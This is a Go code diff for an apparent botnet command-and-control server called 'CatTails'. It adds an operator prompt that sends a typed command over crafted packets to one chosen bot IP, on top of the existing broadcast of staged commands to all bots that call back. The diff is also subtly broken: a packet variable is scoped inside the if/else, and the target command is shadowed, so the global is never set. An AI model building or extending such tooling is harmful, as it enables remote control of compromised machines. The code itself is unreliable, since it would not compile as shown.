@@ -20,6 +20,10 @@ import (
 // Global to store staged command
 var stagedCmd string
 
+// Glabal to store target info
+var targetIP string
+var targetcommand string
+
 // Host defines values for a callback from a bot
 type Host struct {
 	Hostname string
@@ -51,7 +55,11 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		// fmt.Println("DST MAC:", dstMAC)
 		// fmt.Println("SRC IP:", myIP)
 		// fmt.Println("DST IP:", bot.RespIP)
-		packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
+		if targetIP == "" {
+			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
+		} else {
+			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
+		}
 		// YEET
 		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
@@ -103,11 +111,24 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 // Simple CLI to update the "stagedCmd" value
 func cli() {
 	for {
+		// reader type
 		reader := bufio.NewReader(os.Stdin)
+
 		fmt.Print("CatTails> ")
 		stagedCmd, _ = reader.ReadString('\n')
 		// Trim the bullshit newlines
 		stagedCmd = strings.Trim(stagedCmd, "\n")
+		if stagedCmd == "TARGET" {
+			// Get the target IP
+			fmt.Print("Enter IP to target> ")
+			targetIP, _ = reader.ReadString('\n')
+			targetIP = strings.Trim(targetIP, "\n")
+
+			// Get TARGET command
+			fmt.Print("TARGET COMMAND> ")
+			targetcommand, _ := reader.ReadString('\n')
+			targetcommand = strings.Trim(targetcommand, "\n")
+		}
 		fmt.Println("[+] Staged CMD:", stagedCmd)
 	}
 }
